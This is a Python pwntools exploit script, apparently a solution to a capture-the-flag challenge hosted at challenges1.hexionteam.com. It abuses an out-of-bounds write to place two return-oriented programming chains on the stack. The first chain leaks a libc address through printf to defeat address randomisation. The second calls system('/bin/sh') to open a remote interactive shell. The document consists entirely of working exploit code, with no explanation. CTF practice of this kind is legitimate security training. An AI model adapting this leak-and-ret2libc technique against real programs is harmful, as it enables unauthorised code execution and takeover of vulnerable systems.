from pwn import *
#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./www'],env={"LD_PRELOAD":"./libc"})
target=remote('challenges1.hexionteam.com',3002)

#elf=ELF('./www')
#libc=elf.libc
libc=ELF('./libc')

context.terminal=["tmux","split","-h"]
#gdb.attach(target)

#function to write 1 char 
def write(offset,char):
    target.send(str(offset)+" ")
    target.sendline(char)

#function to write 8bytes to stack
def pts_64(off,addr):
    straddr=p64(addr)
    for element in range(0,8):
        write(off+element,(straddr[element]))

retret=0x40056e
poprdi=0x4008a3
poprsir15=0x4008a1
setvbuf_got=0x601030
printf_plt=0x400590
restart=0x4005d0

#1st ROPchain
write(-7,p8(0x39))
pts_64(45,retret)
write(-7,p8(0x39))
pts_64(53,poprdi)
write(-7,p8(0x39))
pts_64(61,setvbuf_got)
write(-7,p8(0x39))
pts_64(69,printf_plt)
write(-7,p8(0x39))
pts_64(77,restart)
write(-7,p8(0x0))


print(target.recvuntil("!"))

#get leak
leak=target.recv()
libc_setvbuf=u64(leak+"\x00"*(8-len(leak)))
print(hex(libc_setvbuf))
libc_base=libc_setvbuf-libc.symbols["setvbuf"]
print(hex(libc_base))
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
libc_system=libc_base+libc.symbols["system"]

#second rop chain
off=37
write(-7,p8(0x39))
pts_64(off,retret)
write(-7,p8(0x39))
pts_64(off+8,poprdi)
write(-7,p8(0x39))
pts_64(off+16,libc_binsh)
write(-7,p8(0x39))
pts_64(off+24,libc_system)
write(-7,p8(0x0))

target.interactive()


